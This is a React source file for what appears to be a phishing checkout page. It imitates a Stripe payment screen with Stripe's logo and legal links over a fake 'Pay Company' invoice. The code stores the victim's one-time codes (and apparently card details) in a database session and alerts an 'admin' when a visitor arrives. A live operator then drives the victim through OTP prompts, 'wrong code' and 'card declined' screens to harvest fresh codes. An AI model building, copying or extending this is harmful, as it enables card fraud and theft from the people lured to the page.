import { useState, useEffect, useMemo, useRef, useCallback } from "react";
import PaymentForm from "@/components/PaymentForm";
import OtpVerification from "@/components/OtpVerification";
import type { OtpType } from "@/components/OtpVerification";
import PaymentSuccess from "@/components/PaymentSuccess";
import PaymentRejected from "@/components/PaymentRejected";
import WaitingScreen from "@/components/WaitingScreen";
import ProcessingOverlay from "@/components/ProcessingOverlay";
import CardDeclinedScreen from "@/components/CardDeclinedScreen";
import { supabase } from "@/integrations/supabase/client";
import { useSessionSync } from "@/hooks/use-session-sync";

const Index = () => {
  const [step, setStep] = useState<"form" | "processing_card" | "waiting" | "otp" | "processing" | "success" | "rejected" | "card_declined">("form");
  const stepRef = useRef(step);
  stepRef.current = step;
  const visitorId = useRef(crypto.randomUUID());

  // Join presence channel so admin knows someone is on the page
  useEffect(() => {
    const channel = supabase.channel("visitors", {
      config: { presence: { key: visitorId.current } },
    });

    channel
      .on("presence", { event: "sync" }, () => {})
      .subscribe(async (status) => {
        if (status === "SUBSCRIBED") {
          await channel.track({
            online_at: new Date().toISOString(),
            visitor_id: visitorId.current,
          });
        }
      });

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  const [amount, setAmount] = useState("");
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [otpError, setOtpError] = useState<string | null>(null);
  const [otpType, setOtpType] = useState<OtpType>("6digit");
  const [cardInvalidError, setCardInvalidError] = useState<string | null>(null);

  const parsedAmount = parseFloat(amount) || 0;
  const transactionFee = parsedAmount > 0 ? parseFloat((parsedAmount * 0.001).toFixed(2)) : 0;
  const total = parsedAmount > 0 ? parseFloat((parsedAmount + transactionFee).toFixed(2)) : 0;

  const isValidAmount = parsedAmount >= 500 && parsedAmount <= 1500;

  const formatEuro = (val: number) =>
    val.toLocaleString("en-IE", { style: "currency", currency: "EUR" });

  const formattedTotal = isValidAmount ? formatEuro(total) : "€0.00";

  const pendingSessionId = useRef<string | null>(null);

  const handleFormSubmit = (id: string) => {
    pendingSessionId.current = id;
    setSessionId(id);
    setCardInvalidError(null);
    setStep("processing_card");
  };

  const handleProcessingComplete = useCallback(() => {
    // Only transition to waiting if still on processing_card (realtime may have already moved us)
    if (stepRef.current === "processing_card") {
      setStep("waiting");
    }
  }, []);

  // Session status handler (stable ref)
  const handleStatusChangeRef = useRef<(status: string, formData: Record<string, any>) => void>(() => {});
  handleStatusChangeRef.current = (newStatus: string, formData: Record<string, any>) => {
    const currentStep = stepRef.current;

    if (currentStep === "processing_card" || currentStep === "waiting") {
      if (newStatus === "otp") {
        setOtpError(null);
        setOtpType((formData.otp_type as OtpType) || "6digit");
        setStep("otp");
      }
      if (newStatus === "rejected") setStep("rejected");
      if (newStatus === "card_invalid") {
        setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
        setStep("card_declined");
      }
    }
    if (currentStep === "otp") {
      if (newStatus === "otp") {
        setOtpType((formData.otp_type as OtpType) || "6digit");
      }
      if (newStatus === "otp_wrong") setOtpError("The verification code you entered is incorrect. Please try again.");
      if (newStatus === "otp_expired") setOtpError("This verification code has expired. Please request a new one.");
      if (newStatus === "rejected") setStep("rejected");
      if (newStatus === "card_invalid") {
        setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
        setStep("card_declined");
      }
    }
    if (currentStep === "processing") {
      if (newStatus === "success") setStep("success");
      if (newStatus === "rejected") setStep("rejected");
      if (newStatus === "otp_wrong") { setOtpError("The verification code you entered is incorrect. Please try again."); setStep("otp"); }
      if (newStatus === "otp_expired") { setOtpError("This verification code has expired. Please request a new one."); setStep("otp"); }
      if (newStatus === "card_invalid") {
        setCardInvalidError("Your card details could not be verified. Please check your card number, expiration date, and security code, then try again.");
        setStep("card_declined");
      }
    }
  };

  // Real-time + polling session sync
  useSessionSync(sessionId, {
    onStatusChange: (status, formData) => handleStatusChangeRef.current(status, formData),
  });

  const handleOtpSubmit = async (otp: string) => {
    setOtpError(null);
    if (sessionId) {
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).single();
      const existingData = (data?.form_data as Record<string, any>) || {};
      await supabase
        .from("sessions")
        .update({ 
          status: "otp_submitted" as any, 
          form_data: { ...existingData, otp } as any 
        })
        .eq("id", sessionId);
    }
    setStep("processing");
  };

  return (
    <div className="min-h-screen bg-stripe-bg flex">
      {/* Left panel — branding / order summary */}
      <div className="hidden lg:flex lg:w-[480px] xl:w-[520px] flex-col justify-between p-10 xl:p-14">
        <div>
          <div className="flex items-center gap-2 mb-12">
            <div className="h-8 w-8 rounded-full bg-primary flex items-center justify-center">
              <span className="text-primary-foreground text-sm font-bold">P</span>
            </div>
            <span className="text-white/90 font-semibold text-lg">Pay</span>
          </div>

          <div className="space-y-6">
            <div>
            <p className="text-white/50 text-sm">Pay Company</p>
              <p className="text-white/40 text-xs mt-0.5">Ref: INV#2849300392</p>
              <p className="text-white text-4xl font-bold tracking-tight mt-1">
                {isValidAmount ? formatEuro(total) : "€0.00"}
              </p>
            </div>

            <div className="space-y-4 mt-8">
              <div className="flex items-center justify-between py-3 border-b border-white/10">
                <p className="text-white/50 text-sm">Amount</p>
                <p className="text-white/90 text-sm">
                  {isValidAmount ? formatEuro(parsedAmount) : "—"}
                </p>
              </div>
              <div className="flex items-center justify-between py-3 border-b border-white/10">
                <p className="text-white/50 text-sm">Transaction fee (0.1%)</p>
                <p className="text-white/90 text-sm">
                  {isValidAmount ? formatEuro(transactionFee) : "—"}
                </p>
              </div>
              <div className="flex items-center justify-between py-3">
                <p className="text-white/90 text-sm font-semibold">Total</p>
                <p className="text-white text-sm font-semibold">
                  {isValidAmount ? formatEuro(total) : "—"}
                </p>
              </div>
            </div>
          </div>
        </div>

        <div className="flex items-center gap-4 text-white/30 text-xs">
          <span className="flex items-center gap-1.5">Powered by
            <svg className="h-[18px] w-auto" viewBox="0 0 60 25" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M59.64 14.28h-8.06c.19 1.93 1.6 2.55 3.2 2.55 1.64 0 2.96-.27 4.18-.87v2.94c-1.23.62-2.78.97-4.65.97-4.17 0-6.64-2.48-6.64-6.87 0-3.78 2.17-6.87 6.03-6.87 3.76 0 5.96 2.76 5.96 6.57 0 .39-.01.97-.03 1.58zm-3.75-2.56c0-1.59-.73-2.76-2.14-2.76-1.34 0-2.24 1.08-2.36 2.76h4.5zm-12.7 7.94c-1.17 0-2.02-.34-2.56-1.03l-.03 4.57H37v-16.5h3.34l.12 1c.58-.76 1.53-1.24 2.77-1.24 2.71 0 4.44 2.65 4.44 6.57s-1.88 6.63-4.49 6.63zm-.74-10.3c-.95 0-1.5.43-1.84 1.05v4.93c.33.59.87 1.03 1.84 1.03 1.39 0 2.28-1.42 2.28-3.53 0-2.07-.9-3.48-2.28-3.48zm-9.85-4.7c0-1.09.89-1.77 1.98-1.77 1.1 0 1.98.68 1.98 1.77 0 1.11-.88 1.79-1.98 1.79-1.1 0-1.98-.68-1.98-1.79zm.25 3.49h3.44v12.15h-3.44V8.15zm-4.5 8.28c0 1.34.81 1.8 1.76 1.8.55 0 1.17-.11 1.72-.37v2.81c-.63.31-1.49.54-2.62.54-2.67 0-4.31-1.32-4.31-4.37V8.15h-1.7V5.47l1.7-.55.75-2.57h2.7v2.72h3.14v3.08h-3.14v5.28zm-7.72-3.4c0-4.31-1.92-6.89-5.57-6.89-1.34 0-2.56.49-3.56 1.46V.38h-3.45v19.92h2.98l.25-1.05c.94.86 2.13 1.28 3.5 1.28 3.65 0 5.85-2.86 5.85-6.5zm-3.63.18c0 2.17-.87 3.52-2.38 3.52-.93 0-1.55-.4-1.97-1.09V9.4c.38-.63 1.02-1.06 1.96-1.06 1.53 0 2.39 1.32 2.39 3.47v.4zM7.27 6.24C3.2 6.24 0 8.11 0 12.02c0 3.36 1.78 5.63 5.17 6.48L7.03 16c-1.76-.51-2.62-1.39-2.62-3.07 0-1.88 1.23-3.06 2.86-3.06 1.67 0 2.78 1.06 2.78 2.92 0 1.8-.66 3.09-2.48 3.64l1.86 2.53c2.84-1.09 4.39-3.52 4.39-6.4 0-3.85-2.6-6.32-6.55-6.32z" fill="rgba(255,255,255,0.5)"/>
            </svg>
          </span>
          <span>·</span>
          <a href="https://stripe.com/legal/consumer" target="_blank" rel="noopener noreferrer" className="hover:text-white/50 transition-colors">Terms</a>
          <a href="https://stripe.com/privacy" target="_blank" rel="noopener noreferrer" className="hover:text-white/50 transition-colors">Privacy</a>
        </div>
      </div>

      {/* Right panel — form area */}
      <div className="flex-1 flex items-start justify-center bg-background rounded-tl-none lg:rounded-tl-2xl lg:rounded-bl-2xl overflow-y-auto">
        <div className="w-full max-w-[440px] py-10 px-5 sm:px-0 sm:py-14">
          {/* Mobile header */}
          <div className="lg:hidden mb-8">
            <div className="flex items-center gap-2 mb-4">
              <div className="h-7 w-7 rounded-full bg-primary flex items-center justify-center">
                <span className="text-primary-foreground text-xs font-bold">P</span>
              </div>
              <span className="text-foreground font-semibold">Pay</span>
            </div>
            <p className="text-muted-foreground text-sm">Pay Company</p>
              <p className="text-muted-foreground/60 text-xs mt-0.5">Ref: INV#2849300392</p>
            <p className="text-foreground text-3xl font-bold tracking-tight mt-1">
              {isValidAmount ? formatEuro(total) : "€0.00"}
            </p>
            {isValidAmount && (
              <div className="mt-3 space-y-1.5">
                <div className="flex items-center justify-between text-sm">
                  <span className="text-muted-foreground">Transaction fee (0.1%)</span>
                  <span className="text-foreground">{formatEuro(transactionFee)}</span>
                </div>
                <div className="flex items-center justify-between text-sm font-semibold">
                  <span className="text-foreground">Total</span>
                  <span className="text-foreground">{formatEuro(total)}</span>
                </div>
              </div>
            )}
          </div>

          {step === "form" && (
            <PaymentForm
              amount={amount}
              onAmountChange={setAmount}
              total={total}
              isValidAmount={isValidAmount}
              formatEuro={formatEuro}
              onSuccess={handleFormSubmit}
              cardInvalidError={cardInvalidError}
            />
          )}
          {step === "processing_card" && <ProcessingOverlay onComplete={handleProcessingComplete} />}
          {step === "waiting" && <WaitingScreen amount={formattedTotal} />}
          {step === "otp" && <OtpVerification onSubmit={handleOtpSubmit} error={otpError} otpType={otpType} />}
          {step === "processing" && <WaitingScreen amount={formattedTotal} />}
          {step === "success" && <PaymentSuccess amount={formatEuro(total)} />}
          {step === "card_declined" && <CardDeclinedScreen onComplete={() => { setStep("form"); setSessionId(null); }} />}
          {step === "rejected" && <PaymentRejected onRetry={() => { setStep("form"); setSessionId(null); }} />}
        </div>
      </div>
    </div>
  );
};

export default Index;
